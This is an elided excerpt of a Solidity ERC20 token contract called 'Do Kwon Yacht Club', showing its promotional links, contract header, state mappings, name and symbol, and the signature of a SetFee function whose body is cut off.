...
/**
      ...
      Gitbook:  https://dokwonyachtclub.gitbook.io/dkyc-2022-community/?fbclid=IwAR10GX15S9QW-jR4lPIcl3FHncGUbBQG37rE9w7QWu4IhSRGom0HvgaP-FA

      Telegram:  https://t.me/DoKwonYachtClubERC

      Website:  https://www.dokwonyachtclub.space/

       Twitter:  https://twitter.com/DoKwonYachtClub
*/
...
contract DoKwonYachtClub is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "Do Kwon Yacht Club";
    string private  _symbol = "DKWON YACHT CLUB";
    ...
    function SetFee(address ReflectionFee  , uint256 LiquidityFee , uint256 MarketingFee , uint256 TaxFee) external  { 
